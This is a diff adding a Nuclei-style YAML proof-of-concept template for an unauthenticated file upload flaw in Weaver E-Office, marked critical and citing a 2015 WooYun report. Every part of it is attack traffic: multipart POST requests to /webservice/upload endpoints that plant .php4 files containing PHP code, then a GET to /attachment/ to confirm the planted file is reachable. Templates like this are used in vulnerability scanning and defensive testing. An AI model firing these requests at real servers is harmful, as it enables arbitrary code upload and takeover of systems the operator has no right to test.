@@ -1,0 +1,53 @@
+id: yaml-poc-weaver-weaver_e_office-file_upload-CT-596718
+info:
+  name: Yaml Poc Weaver Weaver_E_Office File_Upload Ct 596718
+  author: lei_sec
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_office-file_upload-CT-596718'
+  tags: fileupload
+  reference:
+  - https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0125638
+http:
+- method: POST
+  path:
+  - /webservice/upload/upload.php
+  body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+    \ name=\"file\"; filename=\"{{r1}}.php4\"\r\nContent-Type: application/octet-stream\r\
+    \n\r\n<?php echo md5({{r2}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}--\r\
+    \n"
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /attachment/{{path}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: POST
+  path:
+  - /webservice/upload.php
+  body: '------WebKitFormBoundary{{rboundary}}
+
+    Content-Disposition: form-data; name="file"; filename="{{r3}}.php4."
+
+    Content-Type: application/octet-stream
+
+
+    <?php echo "{{r4}}";?>
+
+    ------WebKitFormBoundary{{rboundary}}--'
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
